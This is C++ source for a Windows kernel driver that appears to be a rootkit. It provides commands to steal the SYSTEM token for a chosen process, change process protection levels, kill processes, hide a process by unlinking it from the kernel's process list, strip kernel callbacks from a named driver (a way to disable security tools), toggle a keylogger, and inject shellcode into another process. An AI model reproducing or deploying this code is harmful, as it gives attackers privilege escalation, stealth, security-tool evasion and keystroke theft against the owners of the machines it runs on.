#pragma once

#include <ntifs.h>
#include <wdf.h>

#include "Globals.hpp"
#include "ProcessUtils.hpp"
#include "DriverMeta.hpp"
#include "Misc.hpp"
#include "WinTypes.hpp"
#include "AddressUtils.hpp"
#include "Vector.hpp"
#include "CallbackUtils.hpp"
#include "AutoLock.hpp"

// --------------------------------------------------------------------------------------------------------

NTSTATUS BeCmd_KillProcess(_In_ HANDLE pid);
NTSTATUS BeCmd_ProtectProcess(_In_ ULONG pid, _In_ BYTE newProcessProtection);
NTSTATUS BeCmd_ElevateProcessAcessToken(_In_ HANDLE pid);
NTSTATUS BeCmd_KillProcess(_In_ HANDLE pid);
NTSTATUS BeCmd_HideProcess(_In_ HANDLE pid);
ktd::vector<CALLBACK_DATA, PagedPool> BeCmd_EnumerateCallbacks(_In_ CALLBACK_TYPE callbackType);
NTSTATUS BeCmd_EraseCallbacks(_In_ PWCHAR targetDriver, _In_ CALLBACK_TYPE cbType);
NTSTATUS BeCmd_StartKeylogger(_In_ BOOLEAN start);
NTSTATUS BeCmd_InjectionShellcode(_In_ ULONG pid, _In_ PCWSTR filePath);

// --------------------------------------------------------------------------------------------------------

/*
 * @brief Sets the protection of an arbitrary process by PID.
 *
 * @param[in] Pid PID of the target process.
 * @param[in] NewProtectionLevel New level of protection to apply.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_ProtectProcess(
    _In_ ULONG pid, 
    _In_ BYTE newProtectionLevel)
{
    LOG_MSG("Changing pid %i protection to %i\r\n", pid, newProtectionLevel);
    
    //
    // Lookup process
    //
    PEPROCESS process = BeGetEprocessByPid(pid);
    if (process == NULL)
        return STATUS_INVALID_PARAMETER_1;

    ULONG_PTR protectionLevel = (ULONG_PTR)process + BeGetEprocessProcessProtectionOffset();

    LOG_MSG("Current protection level: %i\r\n", *((BYTE*)(protectionLevel)));

    //
    // Assign new protection level
    //
    *((BYTE*)(protectionLevel)) = newProtectionLevel;

    LOG_MSG("New protection level: %i\r\n", *((BYTE*)(protectionLevel)));

    ObDereferenceObject(process);
    return STATUS_SUCCESS;
}

/*
 * @brief Sets the target process access token to a SYSTEM token.
 *
 * @param[in] Pid PID of the target process.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_ElevateProcessAcessToken(
    _In_ HANDLE pid
)
{
    PEPROCESS pPrivilegedProcess = NULL; 
    PEPROCESS pTargetProcess     = NULL;
    NTSTATUS  status            = STATUS_UNSUCCESSFUL;
    ULONG     tokenOffset       = BeGetAccessTokenOffset();

    //
    // Lookup target process
    //
    status = PsLookupProcessByProcessId(pid, &pTargetProcess);
    if (!NT_SUCCESS(status))
    {
        LOG_MSG("PID %i not found\r\n", HandleToUlong(pid));
        ObDereferenceObject(pTargetProcess);
        return status;
    }

    //
    // Lookup system process (handle for pid 4)
    //
    status = PsLookupProcessByProcessId((HANDLE)4, &pPrivilegedProcess);
    if (!NT_SUCCESS(status))
    {
        LOG_MSG("System process not found with pid 4\r\n");
        ObDereferenceObject(pPrivilegedProcess);
        ObDereferenceObject(pTargetProcess);
        return status;
    }

    LOG_MSG("Token Target: %i", (ULONG)pTargetProcess + tokenOffset);
    LOG_MSG("Token System: %i", (ULONG)pPrivilegedProcess + tokenOffset);

    //
    // Replace target process token with system token
    //
    *(ULONG64*)((ULONG64)pTargetProcess + tokenOffset) = *(ULONG64*)((ULONG64)pPrivilegedProcess + tokenOffset);

    ObDereferenceObject(pPrivilegedProcess);
    ObDereferenceObject(pTargetProcess);
    return status;
}

/*
 * @brief Kills a process by PID.
 *
 * @param[in] Pid PID of the process to kill.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_KillProcess(
    _In_ HANDLE pid
)
{
    HANDLE            hProcess = NULL;
    CLIENT_ID         ci       = { 0 };
    OBJECT_ATTRIBUTES oa       = { 0 };

    PEPROCESS pProcess = BeGetEprocessByPid(HandleToULong(pid));
    if (pProcess == NULL)
    {
        return STATUS_INVALID_PARAMETER;
    }

    ObDereferenceObject(pProcess);

    ci.UniqueProcess = pid;
    oa.Length = sizeof(oa);

    BeGlobals::pZwOpenProcess(&hProcess, 1, &oa, &ci);
    NTSTATUS status = BeGlobals::pZwTerminateProcess(hProcess, 0);
    BeGlobals::pZwClose(hProcess);

    LOG_MSG("KillProcess %i \r\n", status);
    return status;
}

/*
 * @brief Hides a process by removing it from the linked list of active processes referenced in EPROCESS.
 *
 * @param[in] Pid PID of the target process.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_HideProcess(
    _In_ HANDLE pid
)
{
    PEPROCESS pTargetProcess = BeGetEprocessByPid(HandleToULong(pid));
    if (pTargetProcess == NULL)
        return STATUS_INVALID_PARAMETER;

    {
        AutoLock<FastMutex> _lock(BeGlobals::ProcessListLock);
        PLIST_ENTRY pProcessListEntry = (PLIST_ENTRY)((ULONG_PTR)pTargetProcess + BeGetProcessLinkedListOffset());
        RemoveEntryList(pProcessListEntry);
    }
    
    ObDereferenceObject(pTargetProcess);
    return STATUS_SUCCESS;
}

/*
 * @brief Enumerates kernel callbacks.
 *
 * @param[in] Type Type of callback to resolve.
 *
 * @returns ktd::vector<CALLBACK_DATA, PagedPool> Vector of callbacks.
 */
ktd::vector<CALLBACK_DATA, PagedPool>
BeCmd_EnumerateCallbacks(
    _In_ CALLBACK_TYPE type
)
{
    return BeEnumerateKernelCallbacks(type);
}

/*
 * @brief Replaces all kernel callbacks of a specified driver with empty callbacks.
 *
 * @param[in] TargetDriver Name of the target driver.
 * @param[in] CbType Type of callback to remove.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_EraseCallbacks(
    _In_ PWCHAR targetDriver, 
    _In_ CALLBACK_TYPE cbType
)
{
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    Status = BeReplaceKernelCallbacksOfDriver(targetDriver, cbType);
    return Status;
}

/*
 * @brief Starts or stops the keylogger.
 *
 * @param[in] Start TRUE to start, FALSE to stop.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_StartKeylogger(
    _In_ BOOLEAN start
)
{
    BeGlobals::bLogKeys = start;
    LOG_MSG("Log keys: %d\n", start);

    return STATUS_SUCCESS;
}

/*
 * @brief Injects shellcode via ZwCreateThreadEx.
 *
 * @param[in] Pid The process ID of the target process.
 * @param[in] FilePath A pointer to a null-terminated wide string containing the path to the shellcode file.
 *
 * @return NTSTATUS Status code.
 */
NTSTATUS
BeCmd_InjectionShellcode(
    _In_ ULONG  pid,
    _In_ PCWSTR filePath
) 
{
    return BeInjectionShellcode(pid, filePath);
}